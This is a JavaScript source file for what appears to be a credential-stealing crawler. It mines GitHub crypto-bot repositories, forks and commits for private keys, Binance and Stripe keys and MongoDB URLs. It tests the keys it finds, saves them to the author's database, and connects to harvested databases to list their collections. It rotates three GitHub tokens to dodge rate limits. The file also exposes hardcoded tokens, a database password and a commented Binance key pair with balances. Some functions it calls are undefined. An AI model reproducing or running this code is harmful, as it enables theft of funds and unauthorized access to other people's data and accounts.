import  { Octokit } from '@octokit/rest';
import moment from 'moment';
import ccxt from 'ccxt';
import mongoose, { Mongoose, PromiseProvider } from 'mongoose';
import GitHubRepoParser from './githubRepoParser';
import models from './models';
import Promise from 'bluebird';
import { convert } from 'html-to-text';
//import { parseForBinanceKeys,  parseForCoinbaseKeys, parseForMongoDatabaseUrls, parseForPrivateKeys, testKeys } from './workers';
import { spawn, Thread, Worker} from 'threads'
import { makeOctokitRequest } from './middlewares';



const repoQueryOptions = [
  'binance trading bot',
  'crypto arbitrage',
  'python binance',
  'binance api'
]

const Sentry = require('@sentry/node')
const Trading = require('@sentry/tracing')


Sentry.init({
  dsn: "https://1ff02f3dcce144aaaaa7b424918555f8@o1362299.ingest.sentry.io/6653686",
  integrations: [
    // enable HTTP calls tracing
    new Sentry.Integrations.Http({ tracing: true }),
  ],

  // Set tracesSampleRate to 1.0 to capture 100%
  // of transactions for performance monitoring.
  // We recommend adjusting this value in production
  tracesSampleRate: 1.0,
});




let jon = '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'
let user32 = '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'
let eaglesfan = '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'







let ghAccounts = [ eaglesfan, user32,  jon, ]
let ghAccount = ghAccounts[Math.floor(Math.random() * ghAccounts.length)]
let parser



const initGithubAccounts = async () => {
  let accounts = []
  return Promise.map(ghAccounts, async account => {
    let temp = new Octokit({
      auth:  account
    })
    const rateLimitData = await temp.rateLimit.get()
    console.log(rateLimitData)
    //console.log(rateLimitData)
    if(rateLimitData.data.rate.remaining > 0) {
      accounts.push(temp)
    }
    else {

      console.log('account not available until', moment().fromNow(rateLimitData.data.rate.reset))
      //console.log('but lets try anyway')
      //accounts.push(temp)
    }
  }).then(() => {
    if(accounts.length === 0) {
      console.log('no accounts available')
      process.exit()
    }
    else {
      console.log('using', accounts.length)
    }
    return Promise.resolve(accounts)
  })
}









const pickRandomUrl = urls => {
  return urls[Math.floor(Math.random() * urls.length)]
}


async function parseRepos(query,  ghAccount, page) {
  let urlsQueried = []
  let reposAlreadyLookedAt = 0
  let percentageDone
  // setInterval(() => checkStatus(percentageDone), 20000)
  
  console.log('parsing repos, query is', query, 'page is', page, ghAccount !== undefined)
  const initialRepos = await makeOctokitRequest(ghAccount.rest.search.repos({
    q: query,
    order: 'asc',
    page,
    sort: 'best-match',
    per_page: 100
  }), ghAccount)
  let nodes = initialRepos.data.data.items
  console.log('working with', nodes.length)
  
  let uniqueRepos = new Set(nodes)
  let uniqueRepoArray = Array.from(uniqueRepos)
  let promises = []
  //console.log(uniqueRepoArray.map(item => item))
  Promise.each(uniqueRepoArray, async () => {
    const randomRepo = pickRandomUrl(uniqueRepoArray)
    let repoInDb = await mongoose.model('repos').findOne({html_url: randomRepo.html_url})
   // console.log('repo in db', repoInDb)
   if(repoInDb) {
    reposAlreadyLookedAt +=1
    percentageDone = `percentageDone ${reposAlreadyLookedAt / uniqueRepoArray.length}, totalRepos: ${uniqueRepoArray.length}, page: ${page} lookedAt: ${reposAlreadyLookedAt}, reposAlreadyLookedAt: ${reposAlreadyLookedAt}, url: ${randomRepo.html_url} `;
    //console.log('skipping repo')

    //console.log(percentageDone)
    return Promise.resolve(randomRepo)
   }

  else {
      return handleRepo(randomRepo, ghAccount).then(() => {
        reposAlreadyLookedAt += 1
        percentageDone = `percentageDone ${reposAlreadyLookedAt / uniqueRepoArray.length}, totalRepos: ${uniqueRepoArray.length}, page: ${page}, lookedAt: ${reposAlreadyLookedAt},  reposAlreadyLookedAt: ${reposAlreadyLookedAt}, url: ${randomRepo.html_url} `;
        console.log(percentageDone)
        mongoose.model('repos').create(randomRepo).then(res => res.save()).then(() => console.log('repo saved'))
      }).catch(err => {
        Sentry.captureException(err)
      })
    }
  
  })
  

}
async function parseForks(query) {
  let gh = shuffleAccounts(query)
  const initialRepos = await gh.rest.search.repos({
    q:repoQueryOptions[Math.floor(Math.random() * repoQueryOptions.length)],
    order: 'asc',
    sort: 'committer-date',
    per_page: 1
  })
  const repoInstances = initialRepos.data.items
  return Promise.map(repoInstances, async repo => {
    let gh2 = shuffleAccounts(query) // so its harder to rate limit me
    let forks = await gh2.rest.repos.listForks({
      owner: repo.owner.login,
      repo: repo.name
    })
    const forkInstances = forks.data
    return Promise.map(forkInstances, async forkedRepo => {
      let error = false
      const gh3 = shuffleAccounts(query)
      console.log(forkedRepo.name)
      let commitsForFork
      try {
        commitsForFork = await gh3.rest.repos.listCommits({
          owner: forkedRepo.owner.login,
          repo: forkedRepo.name
        })
      }
      catch(err) {
        error = true
        console.log('error getting commits for fork', forkedRepo.name, err.status)
      }
      if(!error) {
        const commitItems = commitsForFork.data;
        Promise.map(commitItems, async commit => {
          const gh4 = shuffleAccounts(query)
          const parents = commit.parents
          return Promise.map(parents, async parent => {
            const tree = await gh4.rest.git.getTree({
              owner: forkedRepo.owner.login,
              repo: forkedRepo.name,
              tree_sha: parent.sha
            })
            const files = tree.data.tree;
            return Promise.map(files, async file => {
              const gh5 = shuffleAccounts(query)
              const content = await gh5.rest.repos.getContent({
                owner: forkedRepo.owner.login,
                repo: forkedRepo.name,
                path: file.path
              })
              return parse(content).then(testKeys)
            })
          })
        })
      }
     
    })
    
  })
  return  gh.rest.search.repos({q: query, page, order:'asc', sort: 'indexed', per_page: 100})
   .then(res => {
    console.log(query, res.data.items.length)
     let items = res.data.items
     //console.log('first', res.data.items[0])
     let missed = 0
     return Promise.map(items, async item => {
      //console.log(item)
      //console.log('item', item.name, item.html_url)
      const owner = item.owner.login
      const repoName = item.html_url.split('/')[4]
      let forks = await gh.rest.repos.listForks({
        owner,
        repo:repoName
      })
      let f = forks.data
      Promise.map(f, async fork => {
        console.log('got fork', fork !== undefined)
        let commits = await gh.rest.repos.listCommits({
          owner: fork.owner.login,
          repo: fork.name
        })
        const d = commits.data
        Promise.map(d, commit => {
          const parents = commit.parents
          Promise.map(parents, async parent => {
            const tree = await gh.rest.git.getTree({
              owner: fork.owner.login,
              repo: fork.name,
              tree_sha: parent.sha
            })
            console.log('got tree', tree !== undefined)
            const files = tree.data.tree
            Promise.map(files, async file => {
              const content = await gh.repos.getContent({
                owner: fork.owner.login,
                repo: fork.name,
                path: file.path
              })
              console.log('got content of file', content !== undefined)
              return parse(content).then(testKey)
              
            })
           
          })
        })
      })
    }).catch(err => err)
  }).catch(err => err)
}



   



const handleRepo = async (repo, ghAccount) => {
  console.log('repo info', repo)
  const data = await parser.collectData(repo.html_url)
  const commits = await makeOctokitRequest(ghAccount.rest.repos.listCommits({
    owner: repo.owner.login,
    repo: repo.name
  }), ghAccount)
  console.log('got commits', commits.data.data)
  
  const shouldIgnore = ['gitignore', 'scss', 'DS_STORE', 'log', 'firebaserc', 'Miscellaneous', 'state', 'gitkeep', 'prettierrc', 'babelrc', 'pub', 'priv', 'gif', 'dockerignore', 'example', 'yml', 'prettierignore', 'jpg', 'eslintrc', 'lock', 'cjs', 'woff', 'sss', 'woff2', 'ttf', 'ico', 'map', 'gitattributes', 'eot', 'css', 'mp4', 'svg', 'ui', 'png', 'md']
  let files = []
  let filesChecked = 0

  //console.log('data', data)
  Object.keys(data).map(k => {
    if(k === 'env') {
      console.log('env found', data[k])
    }
    if(shouldIgnore.indexOf(k) === -1) {
      
      data[k].forEach(url => {
        files.push(url)
      })
    }
   
      
    })
  const commitParser = await spawn(new Worker('./workers/parseCommits'))
  await commitParser(commits.data.data).then(async res => {
    console.log('finished parsing commits', res)
    await Thread.terminate(commitParser)
  })
  files = files.filter(item => item.indexOf('node_modules') === -1).filter(item => item.indexOf('robots.txt') === -1)
  let promises = []
  
  return Promise.each(files, async (file, index) => {
    console.log('file name', file)
    return makeOctokitRequest(ghAccount.request(`GET ${file}`), ghAccount).then(async res => {
      if(typeof res.data.data === 'object') {
        console.log('skipping file')
       return Promise.resolve(file)
      }
      let text = convert(res.data.data, {
        wordwrap: 130
      })
      
      let fileParser = await spawn(new Worker('./workers/parseFile'))
      await fileParser(file).then(async res => {
        console.log('file done being parsed', res)
        await Thread.terminate(fileParser)
      })
    })
      
  })
  
}
const fetchCode = async (query, page) => {
  let reposAlreadyLookedAt = 0
  
  let urlsQueried = []

  const code = await gh.rest.search.code({
    q: query,
    order: 'desc',
    sort: 'best-match',
    per_page: 100,
    page
  }).catch(err => err)
  let codeItems
  try {
    codeItems = code.data.items;
    //console.log('working with', code.data.items.length)
    
    //console.log(code.data.items[0])
  }
  catch(err) {
    console.log('error caught', err)
    return Promise.resolve([])
  }
 
  const uniqueRepos = new Set(codeItems.map(item => item.repository))
  let uniqueRepoArray = Array.from(uniqueRepos)
 

  //console.log(uniqueRepoArray.map(item => item))
  return Promise.each(uniqueRepoArray, async (repo, index) => {
    
    const randomRepo = pickRandomUrl(uniqueRepoArray)
    console.log('picked url', randomRepo.html_url)
    if(urlsQueried.indexOf(randomRepo.html_url) !== -1) {
      return Promise.resolve(null)
    }
    
   return mongoose.model('repos').findOne({repo: {id: randomRepo.id}}).then(repo => {
    // console.log('found repo in db', repo !== null)
      if(repo === false) {
        reposAlreadyLookedAt += 1
        return Promise.resolve(repo)
      }
      else {
        // console.log('repo is', repo)
        reposAlreadyLookedAt +=1
        let percentageDone = `percentageDone ${reposAlreadyLookedAt / uniqueRepoArray.length}, reposAlreadyLookedAt: ${reposAlreadyLookedAt}, totalRepos: ${uniqueRepoArray.length}, lookedAt: ${urlsQueried.length}, url: ${randomRepo.html_url} `;
        
        return handleRepo(randomRepo, percentageDone).then(() => {
          urlsQueried.push(randomRepo.html_url)
        }).catch(err => Sentry.captureException(err))
      }
    }).catch(err => Sentry.captureException(err))
  }).catch(err => Sentry.captureException(err))

}
async function parseCode(query) {
  console.log('running for query', query)
  fetchCode(query,  Math.floor(Math.random() * (10 - 1 + 1) + 1) )
  
}

const parseFile = async file => {
  console.log('parsing file', file)
  let mongoUrlExtractor = await spawn(new Worker('./workers/parseForMongodbUrls'))
          
  let privateKeyExtractor = await spawn(new Worker('./workers/parseForPrivateKeys'))
  let binanceKeyExtractor = await spawn(new Worker('./workers/parseForBinanceKeys'))
  let stripeKeyExtractor = await spawn(new Worker('./workers/parseForStripeKeys'))

  let privateKeys = await privateKeyExtractor(file)
  let binanceKeys = await binanceKeyExtractor(file)
  let stripeKeys = await stripeKeyExtractor(file)
  let mongoDatabases = await mongoUrlExtractor(file)
  let keyTester = await spawn(new Worker('./workers/testKeys'))
  let accounts = await keyTester(privateKeys)
  
  //let mongoUrls = await mongoUrlExtractor(dotEnvFile)
  console.log('private keys', privateKeys)
  console.log('binance keys', binanceKeys)
  console.log('stripe keys', stripeKeys)
  console.log('databases', mongoDatabases)
  console.log('accounts', accounts)
  if(mongoDatabases) {
    console.log('saving mongo url')
    let mongoUrlSaver = await spawn(new Worker('./workers/saveMongoUrls'))
    let saveMongoUrls = await mongoUrlSaver(mongoDatabases)
    await Thread.terminate(mongoUrlSaver).then(console.log)
  }
  if(stripeKeys.length > 0) {
    let stripeKeySaver = await spawn(new Worker('./workers/saveStripeKeys'))
    await stripeKeySaver(stripeKeys).then(() => {
      return Thread.terminate(stripeKeySaver)
    })
  }

  if(binanceKeys.length > 0) {
    let binanceKeySaver = await spawn(new Worker('./workers/saveBinanceKeys'))
    await binanceKeySaver(binanceKeys).then(() => {
      return Thread.terminate(binanceKeySaver).then(console.log)
    })
  }

  await (Thread.terminate(privateKeyExtractor)).then(console.log)
  await (Thread.terminate(binanceKeyExtractor)).then(console.log)
  await (Thread.terminate(stripeKeyExtractor)).then(console.log)
  await (Thread.terminate(mongoUrlExtractor)).then(console.log)
  await (Thread.terminate(keyTester)).then(console.log)
  return Promise.resolve(file)
}

        // console.log('first', res.data.data.files[0])
  //       return Promise.each(res.data.data.files, async (file, index) => {
  //         // return makeOctokitRequest(gh.request(`GET ${file.raw_url}`, {
  //         //   owner: commit.repository.owner.login,
  //         //   repo: commit.repository.name,
  //         //   file_sha: file.sha
  //         // }), gh).then(res => res)
  //         return makeOctokitRequest(gh.rest.git.getBlob({
  //           owner: commit.repository.owner.login,
  //           repo: commit.repository.name,
  //           file_sha: file.sha
  //         }), gh).then(async res => {
  //           const content = res.data.data.content
            
  //           let file = Buffer.from(content, 'base64').toString('utf-8')
  //           console.log(file)
            
  //           //let mongoDatabaseExtractor = await spawn(new Worker('./workers/parseForMongodbUrls'))
  //           // console.log(mongoDatabaseExtractor)
           
  //           let privateKeyExtractor = await spawn(new Worker('./workers/parseForPrivateKeys'))
  //           let binanceKeyExtractor = await spawn(new Worker('./workers/parseForBinanceKeys'))
  //           let privateKeys = await privateKeyExtractor(file)
  //           let binanceKeys = await binanceKeyExtractor(file)
            
  //           let keyTester = await spawn(new Worker('./workers/testKeys'))
  //           let accounts = await keyTester(privateKeys)
  //           console.log(accounts)
            
  //           //const mongooseUrl = await mongoDatabaseExtractor(file)
  //           console.log('private keys', privateKeys)
  //           console.log('binance keys', binanceKeys)
  //           //console.log('mongodb urls', mongooseUrl)
  //           //if(mongooseUrl) {
  //             //console.log('saving mongo url')
  //             //let mongoUrlSaver = await spawn(new Worker('./workers/saveMongoUrls'))
  //             //let saveMongoUrls = await mongoUrlSaver(mongooseUrl)
  //           //}
  //           // let promises = []
  //           // promises.push(parseForBinanceKeys(c))
  //           // promises.push(parseForCoinbaseKeys(c))
  //           // promises.push(parseForPrivateKeys(c))
  //           // return Promise.all(promises).catch(err => {
  //           //   Sentry.captureException(err)
  //           // })
  //         })
  //       }).catch(err => Sentry.captureException(err))
  //     }
  //   }).catch(err => Sentry.captureException(err))
      
  // }).catch(err => Sentry.captureException(err))



// async function parseCommits(query, gh) {
//   const q = query
//   const page = Math.floor(Math.random() * (10 - 1 + 1) + 1)
//   console.log('running for commits. Query is:', q)
//   console.log('page is:', page)

//   const commits = await makeOctokitRequest(gh.rest.search.commits({
//     q,
//     order: 'asc',
//     per_page: 100,
//     page
//   }), gh)
//   const {data, cost} = commits
//   console.log(data, cost)
//   const commitItems = data.data.items;
//   console.log('length', commitItems.length)
  
//   //console.log('got commit', commit)
//   return Promise.each(commitItems, async (commit, index) => {
//     return makeOctokitRequest(gh.request(`GET ${commit.url}`), gh).then(res => {

//       const dotEnv = res.data.data.files.find(file => file.filename === '.env')
//       const configs = res.data.data.files.filter(file => file.filename.includes('config') || file.filename.includes('settings'))
//       if(configs.length > 0) {
//         console.log('configs found for commit', commit)
//       }
//       if(dotEnv) {
//         return makeOctokitRequest(gh.rest.git.getBlob({
//           owner: commit.repository.owner.login,
//           repo: commit.repository.name,
//           file_sha: dotEnv.sha
//         }), gh).then(async res => {
//           const {data, cost} = res
//           console.log('blob cost', cost)
//           const content = data.data.content
//           let file = Buffer.from(content, 'base64').toString('utf-8')
//           console.log(dotEnvFile)
//           //let mongoUrlExtractor = await spawn(new Worker('./workers/parseForMongodbUrls'))
          
//           let privateKeyExtractor = await spawn(new Worker('./workers/parseForPrivateKeys'))
//           let binanceKeyExtractor = await spawn(new Worker('./workers/parseForBinanceKeys'))
//           let privateKeys = await privateKeyExtractor(dotEnvFile)
//           let binanceKeys = await binanceKeyExtractor(dotEnvFile)
//           //let mongoUrls = await mongoUrlExtractor(dotEnvFile)
//           console.log('private keys', privateKeys)
//           console.log('binance keys', binanceKeys)
//           //console.log('mongo urls', mongoUrls)
//           //if(mongoUrls) {
//             //console.log('saving mongo url')
//             //let mongoUrlSaver = await spawn(new Worker('./workers/saveMongoUrls'))
//             //let saveMongoUrls = await mongoUrlSaver(mongoUrls)
//           //}
//          // let mongoDatabaseExtractor = await spawn(new Worker('./workers/parseForMongodbUrls'))
//           // let mongoUrl = parseForMongoDatabaseUrls(c)
//           // console.log('got mongourl', mongoUrl)
//           // let promises = []
//           // promises.push(parseForBinanceKeys(c))
//           // promises.push(parseForCoinbaseKeys(c))
//           // promises.push(parseForPrivateKeys(c))
    
//         })
//       }
//       else {
//         console.log('else running')
//         return Promise.each(res.data.files, async (file, index) => {
//           return makeOctokitRequest(gh.rest.git.getBlob({
//             owner: commit.repository.owner.login,
//             repo: commit.repository.name,
//             file_sha: file.sha
//           }), gh).then(async res => {
//             const content = res.data.data.content
//             let dotEnvFile = Buffer.from(content).toString('utf-8')
            
//             //let mongoDatabaseExtractor = await spawn(new Worker('./workers/parseForMongodbUrls'))
//             // console.log(mongoDatabaseExtractor)
           
//             let privateKeyExtractor = await spawn(new Worker('./workers/parseForPrivateKeys'))
//             let binanceKeyExtractor = await spawn(new Worker('./workers/parseForBinanceKeys'))
//             let privateKeys = await privateKeyExtractor(dotEnvFile)
//             let binanceKeys = await binanceKeyExtractor(dotEnvFile)
            
//             let keyTester = await spawn(new Worker('./workers/testKeys'))
//             let accounts = await keyTester(privateKeys)
//             console.log(accounts)
            
//             //const mongooseUrl = await mongoDatabaseExtractor(dotEnvFile)
//             console.log('private keys', privateKeys)
//             console.log('binance keys', binanceKeys)
//             //console.log('mongodb urls', mongooseUrl)
//             //if(mongooseUrl) {
//               //console.log('saving mongo url')
//               //let mongoUrlSaver = await spawn(new Worker('./workers/saveMongoUrls'))
//               //let saveMongoUrls = await mongoUrlSaver(mongooseUrl)
//             //}
//             // let promises = []
//             // promises.push(parseForBinanceKeys(c))
//             // promises.push(parseForCoinbaseKeys(c))
//             // promises.push(parseForPrivateKeys(c))
//             // return Promise.all(promises).catch(err => {
//             //   Sentry.captureException(err)
//             // })
//           })
//         }).catch(err => Sentry.captureException(err))
//       }
//     }).catch(err => Sentry.captureException(err))
      
//   }).catch(err => Sentry.captureException(err))
// }

const runAction = (actionType, query, ghAccount, page) => {
  switch(actionType) {
    case 'parseCode':
      return parseCode(query).catch(console.log)
    case 'parseForks':
      return parseForks(query)
    case 'parseRepos':
      return parseRepos(query, ghAccount, page)
    case 'parseCommits':
      return parseCommits(query, ghAccount, page)
    default:
      parseRepos(query)
  }
}

const startConsuming = async () => {
  console.log('consuming')
  let urlFetcher = await spawn(new Worker('./workers/collectDatabaseUrls'))
  let urls = await urlFetcher()
  let url =
  Promise.all(Promise.map(urls, async url => {
      const tmpDb = await new mongoose.Mongoose()
      const connection = await tmpDb.connect(url)
      if(connection) {
        const collectionNames = await (await tmpDb.connection.db.listCollections().toArray()).map(item => item.name)
        const modelNames = collectionNames.map(name => name.charAt(0).toUpperCase() + name.slice(1))
        let schema = new mongoose.Schema({}, {strict: false})
        // console.log('got schema', schema)

        const models = modelNames.map(name => {
          return collectionNames.map(collectionName => {
            console.log('collection name', collectionName)
            // console.log('collection name', collectionName)
            // console.log('model name', name)
            return tmpDb.model(name, schema, collectionName)
          })
        }).reduce((a, b) => [...a, ...b])
       
      //  Promise.map(models, async model => {
      //   console.log(await model.find())
      //  })
        
      }
      
      
      //let 
      //console.log(tmpDb.model(collectionName.charAt(0).toUpperCase() + collectionName.slice(1)))
    }))
   
   
   //console.log(await connection.modelNames())
    //console.log(Object.keys(connection))
    // const collections = await await connection.db.listCollections().toArray().map(item => item.name)
  
    // let tmpDb = await new mongoose.Mongoose()
    // let connection = await tmpDb.connect(url)
    // if(connection) {
    //   // console.log('connection established for url', url)
    //   let collectionNames = await (await tmpDb.connection.db.listCollections().toArray()).map(item => item.name)
    //   // console.log(collectionNames)
    //   console.log(collectionNames[0])
    //   let Schema = new mongoose.Schema({}, {strict: false})
    //  let collection = await tmpDb.connection.db.collection(collectionNames[0], Schema).find()
    //  console.log(await collection[`_${collectionNames[0]}`].get())
      // tmpDb.connection.db.collection(collectionNames[0], (err, collection) => {
      //   console.log(err)
      //   console.log(collection)
      // })
      // console.log(tmpDb.connection.db)
      
}
const startInitial = async () => {
  console.log('running initial')
  initGithubAccounts().then(async accounts => {
    console.log('got accounts', accounts.length)
    let ghAccount = accounts[Math.floor(Math.random() * accounts.length)]
    parser = new GitHubRepoParser(ghAccount)
    let page = Math.floor(Math.random() * (10 - 1 + 1) + 1)
    const topicCount = await mongoose.model('repos').countDocuments({ topics: { $exists: true, $not: {$size: 0} } })
    var random = Math.floor(Math.random() * topicCount)
    const query = 'delete .env'
    console.log('topics', topicCount)
    let queryForRepo 
    // mongoose.model('repos').findOne({ topics: { $exists: true, $not: {$size: 0} } }).skip(random).then(res => {
    //   const {topics} = res;
    //   let queryForRepo
    //   if(topics.length > 0) {
    //     queryForRepo = topics[Math.floor(Math.random() * topics.length)]

    //   }
    //   else {
    //     queryForRepo = 'ccxt.binance'
    //   }
    //     // console.log('topics length', topics.length)
        
       
    //   }).catch(err => {
    //     queryForRepo = 'ccxt.binance'
    //     Sentry.captureException(err)
    //   })
      runAction('parseRepos', 'binance bot', ghAccount, page)
     // runAction('parseCommits', query, ghAccount, page)
      
    }).catch(err => {

      Sentry.captureException(err)
    })
   
}
const startParsing =  async () => {
  process.on('uncaughtException', (err) => Sentry.captureException(err))
  process.on('unhandledRejection', (err) => {
    console.log(err)
    Sentry.captureException(err)
  })
  
  mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
    console.log('connected to db')
    //return runAction('parseCommits')
    //const prefixes = initApiKeyPrefixes().reduce((a, b) => [...a, ...b])
    // const min = 0
    // const max = 1000
    // const randNum = Math.floor(Math.random() * (max - min))
    // console.log('random number', randNum)
    
        // console.log('running action parse repos with', query)
    setInterval(() => {
      console.log('starting to parse commits')
      initGithubAccounts().then(async accounts => {
        console.log('got accounts', accounts.length)
        let ghAccount = accounts[Math.floor(Math.random() * accounts.length)]
        parser = new GitHubRepoParser(ghAccount)
        let page = Math.floor(Math.random() * 10 - 1)
        const topicCount = await mongoose.model('repos').countDocuments({ topics: { $exists: true, $not: {$size: 0} } })
        var random = Math.floor(Math.random() * topicCount)
        const query = 'delete .env'
        console.log('topics', topicCount)
        let queryForRepo 
        mongoose.model('repos').findOne({ topics: { $exists: true, $not: {$size: 0} } }).skip(random).then(res => {
          const {topics} = res;
          let queryForRepo
          if(topics.length > 0) {
            queryForRepo = topics[Math.floor(Math.random() * topics.length)]

          }
          else {
            queryForRepo = 'ccxt.binance'
          }
            // console.log('topics length', topics.length)
            
           
          }).catch(err => {
            queryForRepo = 'ccxt.binance'
            Sentry.captureException(err)
          })
          runAction('parseRepos', queryForRepo, ghAccount, page)
          runAction('parseCommits', query, ghAccount, page)
          
        }).catch(err => {

          Sentry.captureException(err)
        })

        
        
      }, 600000)// 10 minutes
    startInitial()
    
  })
}

   
    
      
    // mongoose.model('binanceAccounts').create({
      
    //     token: 'zyN3R5T1FOPwKLBvxnf09X6EkKzcIEBCes1RpNqD6moXU7YoqOBX3M2vFcUgCAQy',        
    //     secret: 'dQMgSnNJs3MrBvU5qx65WYmn7PIAK9o0LLjLLVmPicjjCsWTA3iFA6H9UwDKn55h',       
    //     cryptos: [
    //       { crypto: 'BTC', balance: 0.00754945 },
    //       { crypto: 'USDT', balance: 75.82065341 },
    //       { crypto: 'MATIC', balance: 35.8641 },
    //       { crypto: 'BUSD', balance: 113.1459823 },
    //       { crypto: 'SAND', balance: 9.98071452 },
    //       { crypto: 'LUNA', balance: 0.13644845 },
    //       { crypto: 'LUNC', balance: 0.00253 }
    //     ],
       
      
    // }).then(doc => {
    //   console.log('got doc', doc)
    //   return doc.save()
    // }).then(console.log)
    // mongoose.model('binanceAccounts').find().then(doc => {
    //   console.log('got doc', doc)
      
    // })
    //  for(let i=0; i< 5; i++) {
    //   let action = actionTypes[Math.floor(Math.random() * actionTypes.length)]
     
    //   runAction(action)
    //  }
    
   
const removeRepos = () => {
  return mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
  mongoose.model('repos').remove().then(console.log)
})
}

startParsing()

//startConsuming()